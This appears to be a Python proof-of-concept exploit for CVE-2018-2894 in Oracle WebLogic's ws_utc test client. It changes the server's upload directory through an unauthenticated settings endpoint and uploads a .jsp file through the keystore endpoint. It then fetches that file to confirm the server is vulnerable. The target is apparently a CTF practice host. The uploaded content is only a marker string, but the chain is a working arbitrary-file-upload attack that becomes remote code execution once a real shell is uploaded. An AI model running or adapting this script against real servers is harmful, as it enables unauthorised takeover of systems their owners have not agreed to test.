#!/usr/bin/env python
# coding:utf-8
import re
import time
import requests
import xml.etree.ElementTree as ET


def get_current_work_path(host):
    geturl = host + "/ws_utc/resources/setting/options/general"
    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
    values = []
    try:
        request = requests.get(geturl)
        if request.status_code == 404:
            exit("[-] {}  don't exists CVE-2018-2894".format(host))
        elif "Deploying Application".lower() in request.text.lower():
            print("[*] First Deploying Website Please wait a moment ...")
            time.sleep(20)
            request = requests.get(geturl, headers=ua)
        if b"</defaultValue>" in request.content:
            root = ET.fromstring(request.content)
            value = root.find("section").find("options")
            for e in value:
                for sub in e:
                    if e.tag == "parameter" and sub.tag == "defaultValue":
                        values.append(sub.text)
    except requests.ConnectionError:
        exit("[-] Cannot connect url: {}".format(geturl))
    if values:
        return values[0]
    else:
        print("[-] Cannot get current work path\n")
        exit(request.content)


def get_new_work_path(host):
    origin_work_path = get_current_work_path(host)
    works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
    if "user_projects" in origin_work_path:
        if "\\" in origin_work_path:
            works = works.replace("/", "\\")
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
            dir_len = len(current_work_home.split("\\"))
            domain_name = origin_work_path.split("\\")[dir_len]
            current_work_home += "\\" + domain_name + works
        else:
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
            dir_len = len(current_work_home.split("/"))
            domain_name = origin_work_path.split("/")[dir_len]
            current_work_home += "/" + domain_name + works
    else:
        current_work_home = origin_work_path
        print("[*] cannot handle current work home dir: {}".format(origin_work_path))
    return current_work_home


def set_new_upload_path(host, path):
    data = {
        "setting_id": "general",
        "BasicConfigOptions.workDir": path,
        "BasicConfigOptions.proxyHost": "",
        "BasicConfigOptions.proxyPort": "80"}
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest', }
    request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers)
    if b"successfully" in request.content:
        return True
    else:
        print("[-] Change New Upload Path failed")
        exit(request.content)


def poc(url, username):
    try:
        vulnurl = "/ws_utc/resources/setting/keystore"
        set_new_upload_path(url, get_new_work_path(url))
        upload_content = username + " test"
        files = {
            "ks_edit_mode": "false",
            "ks_password_front": username,
            "ks_password_changed": "true",
            "ks_filename": ("360sglab.jsp", upload_content)
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest', }

        request = requests.post(url + vulnurl, files=files)
        response = request.text
        match = re.findall("<id>(.*?)</id>", response)
        if match:
            tid = match[-1]
            shell_path = url + "/ws_utc/css/config/keystore/" + str(tid) + "_360sglab.jsp"
            if bytes(upload_content, encoding="utf8") in requests.get(shell_path, headers=headers).content:
                print("[+] {} exists CVE-2018-2894".format(url))
                print("[+] Check URL: {} ".format(shell_path))
                return True
            else:
                print("[-] {}  don't exists CVE-2018-2894".format(url))
        else:
            print("[-] {}  don't exists CVE-2018-2894".format(url))
    except:
        return False
    return False


if __name__ == "__main__":
    username = "weblogic1"
    url = "http://node3.buuoj.cn:27291"
    # url = "http://127.0.0.1:7001"
    print(poc(url, username))


